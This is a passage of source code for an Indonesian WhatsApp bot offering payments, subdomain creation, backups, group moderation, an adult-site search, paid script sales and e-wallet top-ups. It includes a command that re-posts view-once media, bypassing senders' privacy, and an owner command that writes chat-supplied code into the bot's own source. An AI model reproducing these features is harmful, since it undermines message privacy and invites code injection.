- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
        });

        await reply(teks)

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

//=============================================//

case "qr": {
    if (!isOwner) return reply(mess.owner);
    if (!text || isNaN(text.trim())) {
        return reply(`Masukan nominal yang valid\n*contoh:* ${cmd} 5000`);
    }

    try {
        const amount = text.trim();
        const url = `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`;
        const { data } = await axios.get(url);

        if (!data?.result?.imageqris?.url) {
            return reply("Gagal mendapatkan QRIS. Periksa kembali API atau parameter.");
        }

        return sock.sendMessage(
            m.chat,
            { image: { url: data.result.imageqris.url }, caption: `Berikut QR untuk nominal *Rp${toRupiah(amount)}*` },
            { quoted: m }
        );
    } catch (err) {
        console.error("QRIS Error:", err);
        return reply("Terjadi kesalahan saat membuat QRIS. Coba lagi nanti.");
    }
}
break;

//=============================================//

case "payment": case "pay": case "dana": case "ovo": case "gopay": case "qris": {
const teksPayment = `
*Daftar Payment Skyzopedia 🔖*

* *Dana :* ${global.payment.dana}
* *Ovo :* ${global.payment.ovo}
* *Gopay :* ${global.payment.gopay}

*Penting!*
Wajib kirimkan bukti transfer demi keamanan bersama!
`
return sock.sendMessage(m.chat, {image: {url: global.payment.qris}, caption: teksPayment}, {quoted: m})
}
break;

//=============================================//

case "subdo": case "subdomain": {
if (!isOwner) return reply(mess.owner);
if (!text.includes("|")) return reply(`Format salah!\n*contoh:* ${cmd} hostname|ipvps`)
const obj = Object.keys(subdomain);
if (obj.length < 1) return reply("Tidak ada domain yang tersedia.")
const rows = []
const hostname = text.split("|")[0].toLowerCase()
const ip = text.split("|")[1]
obj.forEach((domain, index) => rows.push({
title: `🌐 ${domain}`,
description: `Result: https://${hostname}.${domain}`, 
id: `.subdomain-response ${index + 1} ${hostname.trim()}|${ip}`
}))
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Domain Server Yang Tersedia\nTotal Domain: ${obj.length}\n`
}, { quoted: m })
}
break


//=============================================//

case "subdomain-response": { 
if (!isOwner) return reply(mess.owner);
if (!text) return 
if (!args[0] || isNaN(args[0])) return reply("Domain tidak ditemukan!");
const dom = Object.keys(subdomain);
const domainIndex = Number(args[0]) - 1;
if (domainIndex >= dom.length || domainIndex < 0) return reply("Domain tidak ditemukan!");

if (!args[1] || !args[1].includes("|")) return reply("Hostname/IP Tidak ditemukan!");

let tldnya = dom[domainIndex];
const [host, ip] = args[1].split("|").map(str => str.trim());

async function subDomain1(host, ip) {
    return new Promise((resolve) => {
        axios.post(
            `https://api.cloudflare.com/client/v4/zones/${subdomain[tldnya].zone}/dns_records`,
            {
                type: "A",
                name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                content: ip.replace(/[^0-9.]/gi, ""),
                ttl: 3600,
                priority: 10,
                proxied: false,
            },
            {
                headers: {
                    Authorization: `Bearer ${subdomain[tldnya].apitoken}`,
                    "Content-Type": "application/json",
                },
            }
        ).then(response => {
            let res = response.data;
            if (res.success) {
                resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
            } else {
                resolve({ success: false, error: "Gagal membuat subdomain." });
            }
        }).catch(error => {
            let errorMsg = error.response?.data?.errors?.[0]?.message || error.message || "Terjadi kesalahan!";
            resolve({ success: false, error: errorMsg });
        });
    });
}

let teks = `\nSubdomain Berhasil Dibuat ✅\n\n- IP: ${ip}\n`;
const domnode = `node${getRandom("")}.${host}`;

for (let i = 0; i < 2; i++) {
    let subHost = i === 0 ? host.toLowerCase() : domnode;
    try {
        let result = await subDomain1(subHost, ip);
        if (result.success) {
            teks += `- ${i == 1 ? "Node:" : "Panel:"} ${result.name}\n`;
        } else {
            return reply(result.error);
        }
    } catch (err) {
        return reply("Error: " + err.message);
    }
}

await reply(teks);

}
break;

//=============================================//

case "backupsc":
case "bck":
case "backup": {
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber)
        return reply(mess.owner)
    try {        
        const tmpDir = "./Tmp";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }
        await reply("Memproses Backup Script ...");        
        const name = `${namaBot}-Version-${versiBot}`; 
        const exclude = ["node_modules", "Auth", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return reply("Tidak ada file yang dapat di-backup.");

        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        await sock.sendMessage(m.sender, {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        }, { quoted: m });

        fs.unlinkSync(`./${name}.zip`);

        if (m.chat !== m.sender) reply("Backup script telah berhasil ✅\nFile dikirim ke dalam Chat Pribadi");
    } catch (err) {
        console.error("Backup Error:", err);
        reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

//=============================================//

case "addcase": {
  if (!isOwner) return reply(mess.owner);
  if (!text && !m.quoted?.text) {
    return reply(`*Contoh:* ${cmd} kode / reply kode\n\nContoh kode case:\ncase "bot": {\n  return reply("Hello!")\n}\nbreak`);
  }

  const tt = m.quoted?.text ? m.quoted.text : text;

  // Fungsi validasi format case
  function isValidCaseCode(str) {
    const regex = /^case\s+["'`](.+?)["'`]:\s*\{\s*[\s\S]*?\}\s*break\s*;?$/gm;
    return regex.test(str.trim());
  }

  function addCaseToFile(filePath, caseCode) {
    if (!isValidCaseCode(caseCode)) {
      return reply("❌ Format case tidak valid.\n\nContoh benar:\ncase \"bot\": {\n  return reply(\"Hello!\")\n}\nbreak");
    }

    const code = fs.readFileSync(filePath, "utf8");

    const Devindex = code.indexOf(`default` + ":");
    if (Devindex === -1) {
      return reply("Gagal: tidak ditemukan di file case.js");
    }

    const newCode =
      code.slice(0, Devindex) +
      `\n\n  ${caseCode.trim()}\n` +
      code.slice(Devindex);

    fs.writeFileSync(filePath, newCode, "utf8");
    reply("✅ Case baru berhasil ditambahkan!");
  }

  addCaseToFile("./case.js", tt);
}
break;
//=============================================//

case "getcase": {
if (!isOwner) return reply(mess.owner)
if (!text) {
const code = fs.readFileSync('case.js', 'utf8');
const regex = /case\s+["'`](.+?)["'`]\s*:/g;
let match;
const cases = [];
while ((match = regex.exec(code)) !== null) {
  cases.push(match[1]);
}
const rows = []
cases.forEach((name, index) => rows.push({
title: `${name}`,
description: `Klik untuk melihat detail case ${name}`, 
id: `.getcase ${name}`
}))
return sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Case',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Case Yang Ingin Dilihat\nTotal Case: ${cases.length}\n`
}, { quoted: m })
}
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* tidak ditemukan`)
}
}
break

//=============================================//

case "listcase": {
if (!isOwner) return reply(mess.owner)
const code = fs.readFileSync('case.js', 'utf8');
const regex = /case\s+["'`](.+?)["'`]\s*:/g;
let match;
const cases = [];
while ((match = regex.exec(code)) !== null) {
  cases.push(match[1]);
}
return reply(`
*Total Case:* ${cases.length}

- ${cases.join("\n- ")}
`)
}
break

//=============================================//

case "ambilq": case "q": {
if (!m.quoted) return 
reply(JSON.stringify(m.quoted.fakeObj.message, null, 2))
}
break

//=============================================//

case "rst": case "restart": {
if (!isOwner) return
function restartServer() {
const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });
  process.exit(0);
}
await reply("*🚀 Restarting bot . . . .*")
await setTimeout(() => {
restartServer();
}, 4500)
}
break

//=============================================//

case "antilinkch": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
const isAntilinkch = Antilinkch.includes(m.chat)
if (text == "on") {
if (isAntilinkch) return reply(`Antilinkch di grup ini sudah aktif!`)
Antilinkch.push(m.chat)
await fs.writeFileSync("./Data/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return reply(`Antilinkch berhasil diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilinkch) return reply(`Antilinkch di grup ini sudah tidak aktif!`)
 const posisi = Antilinkch.indexOf(m.chat)
Antilinkch.splice(posisi, 1)
await fs.writeFileSync("./Data/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return reply(`Antilinkch berhasil dimatikan ✅`)
}
}
break

//=============================================//

case "antilink": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
const isAntilink = Antilink.includes(m.chat)
const isAntilink2 = Antilink2.includes(m.chat)
if (text == "on") {
if (isAntilink) return reply(`Antilink di grup ini sudah aktif!`)
if (isAntilink2) {
const posisi = Antilink2.indexOf(m.chat)
Antilink2.splice(posisi, 1)
await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2))
}
Antilink.push(m.chat)
await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2))
return reply(`Antilink berhasil diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilink) return reply(`Antilink di grup ini sudah tidak aktif!`)
 const posisi = Antilink.indexOf(m.chat)
Antilink.splice(posisi, 1)
await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2))
return reply(`Antilink berhasil dimatikan ✅`)
}
}
break

//=============================================//

case "antilink2": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
const isAntilink = Antilink.includes(m.chat)
const isAntilink2 = Antilink2.includes(m.chat)
if (text == "on") {
if (isAntilink2) return reply(`Antilink2 di grup ini sudah aktif!`)
if (isAntilink) {
const posisi = Antilink.indexOf(m.chat)
Antilink.splice(posisi, 1)
await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2))
}
Antilink2.push(m.chat)
await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2))
return reply(`Antilink2 berhasil diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilink2) return reply(`Antilink2 di grup ini sudah tidak aktif!`)
 const posisi = Antilink2.indexOf(m.chat)
Antilink2.splice(posisi, 1)
await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2))
return reply(`Antilink2 berhasil dimatikan ✅`)
}
}
break

//=============================================//

case "welcome": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
if (!/on|off/.test(text)) return reply(`*contoh:* ${cmd} on/off`)
if (/on/.test(text)) {
set.welcome = true
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil menyalakan welcome ✅`)
}
if (/off/.test(text)) {
set.welcome = false
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil mematikan welcome ✅`)
}
}
break

//=============================================//

case "autoread": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
if (!/on|off/.test(text)) return reply(`*contoh:* ${cmd} on/off`)
if (/on/.test(text)) {
set.autoread = true
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil menyalakan autoread ✅`)
}
if (/off/.test(text)) {
set.autoread = false
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil mematikan autoread ✅`)
}
}
break

//=============================================//

case "anticall": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`*contoh:* ${cmd} on/off`)
if (!/on|off/.test(text)) return reply(`*contoh:* ${cmd} on/off`)
if (/on/.test(text)) {
set.anticall = true
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil menyalakan anticall ✅`)
}
if (/off/.test(text)) {
set.anticall = false
await fs.writeFileSync("./Data/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil mematikan anticall ✅`)
}
}
break

//=============================================//

case "pinterest": case "pin": {
if (!text) return reply(`Masukan title\n*contoh:* ${cmd} wallpaper anime`)
try {
const data = await fetchJson(`https://api-simplebot.vercel.app/search/pinterest?apikey=${global.ApikeyRestApi}&q=${text}`).then(res => res.result.map(e => e))
let jumlah = 5
if (data.length < jumlah) jumlah = data.length
for (let i = 0; i < jumlah; i++) {
await sock.sendMessage(m.chat, {image: { url: data[i] }, caption: `Hasil pencarian pinterest *${text}* ke ${i+1}`}, { quoted: m })
}
} catch (err) {
return reply(err)
}
}
break

//=============================================//

case "xnxxs": {
if (!text) return reply(`Masukan title\n*contoh:* ${cmd} hentai`)
try {
const data = await fetchJson(`https://api-simplebot.vercel.app/search/xnxx?apikey=${global.ApikeyRestApi}&q=${text}`)
let teks = "\n"
for (let i of data.result) {
teks += `- *Title:* ${i.title}
- *Info:* ${i.info.trim()}
- *Link:* ${i.link}\n\n`
}
reply(teks)
} catch (err) {
return reply(err)
}
}
break

//=============================================//

case "rvo": case "readviewonce": {
if (!m.quoted) return reply("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//=============================================//

case "chowner": {
await m.reply(global.linkChannel)
}
break

//=============================================//

case "batalbeli": {
if (m.isGroup) return
if (!sock[m.sender]) return 
await sock.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: sock[m.sender].msg})
await sock.sendMessage(m.chat, { delete: sock[m.sender].msg.key })
await clearTimeout(sock[m.sender].exp)
delete sock[m.sender];
}
break

//=============================================//

case "beliscript": case "buysc": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
  if (Script.length < 1) return m.reply("Tidak ada script yang tersedia.")
 if (!text) {
let rows = []
let number = 0
for (let u of Script) {
rows.push({
title: u.nama,
description: `Rp${await toRupiah(u.harga)}`, 
id: `.buysc ${u.nama}`
})
}
return sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Script Yang Tersedia\n`
}, { quoted: m })
  }

  let Obj = {};
  const Sc = Script.find(e => e.nama == text)
  if (!Sc) return m.reply("Pilihan Script tidak valid!");
  dts = Sc
  Obj.nama = dts.nama
  Obj.harga = dts.harga
  Obj.url = dts.url
  Obj.deskripsi = dts.deskripsi
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
`,
        }, { quoted: sock[m.sender].msg });
        
        await sock.sendMessage(sock[m.sender].chat, {
            document: {url: Obj.url},
            caption: Obj.deskripsi, 
            fileName: Obj.nama + ".zip",
            mimetype: "application/zip",
        }, { quoted: null });
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "belireseller": case "buyresellerpanel": 
case "buyreseller": case "buyrespanel": 
case "belirespanel": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
  if (global.linkGrupResellerPanel.length < 1) return m.reply("Reseller Panel sedang tidak tersedia.")
  const Obj = {}
  
  Obj.nama = "Reseller Panel"
  Obj.harga = "15000" // Harga Reseller Panel
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
`,
        }, { quoted: sock[m.sender].msg });
        
const teksres = `
Link Grup Reseller Panel
- ${global.linkGrupResellerPanel}

Contact Owner
- ${global.owner}
`
        await sock.sendMessage(
          sock[m.sender].chat,
          {
            text: teksres,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "topupdana": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan nomor dana\n*contoh:* ${cmd} 0838XXX`)
  if (!text.includes("|")) {
  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let dana = data.filter(item => /DANA/i.test(item.keterangan) && /DOMPET DIGITAL/i.test(item.kategori) && item.harga > 0);
    let sections = []
    for (let item of dana) {
    sections.push({
    title: item.keterangan, 
    description: `Rp${await toRupiah(item.harga)}`, 
    id: `.topupdana ${text.replace(/[^0-9]/g, "").trim()}|${item.harga}|${item.kode}|${item.keterangan}`
    })
    }
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Jumlah",
            sections: [
              {
                rows: sections, 
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Jumlah Topup Saldo Dana\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  Obj.nomor = text.split("|")[0]
  Obj.harga = text.split("|")[1]
  Obj.nama = text.split("|")[3]
  Obj.kode = text.split("|")[2]
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
`,
        }, { quoted: sock[m.sender].msg });

        const idtrx = "sock" + `${Date.now()}`;
        await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        await sleep(6000);
        let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        if (/status Sukses/.test(dt)) {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
        } else {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
          await sock.sendMessage(sock[m.sender].chat, { text: `Terjadi kesalahan saat melakukan transaksi

Hubungi ownerbot
- https://wa.me/${global.owner}`, contextInfo: { isForwarded: true } }, { quoted: null });
        }
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "topupovo": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan nomor ovo\n*contoh:* ${cmd} 0838XXX`)
  if (!text.includes("|")) {
  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let dana = data.filter(item => /OVO/i.test(item.keterangan) && /DOMPET DIGITAL/i.test(item.kategori) && item.harga > 0);
    let sections = []
    for (let item of dana) {
    sections.push({
    title: item.keterangan, 
    description: `Rp${await toRupiah(item.harga)}`, 
    id: `.topupovo ${text.replace(/[^0-9]/g, "").trim()}|${item.harga}|${item.kode}|${item.keterangan}`
    })
    }
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Jumlah",
            sections: [
              {
                rows: sections, 
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Jumlah Topup Saldo Ovo\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  Obj.nomor = text.split("|")[0]
  Obj.harga = text.split("|")[1]
  Obj.nama = text.split("|")[3]
  Obj.kode = text.split("|")[2]
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
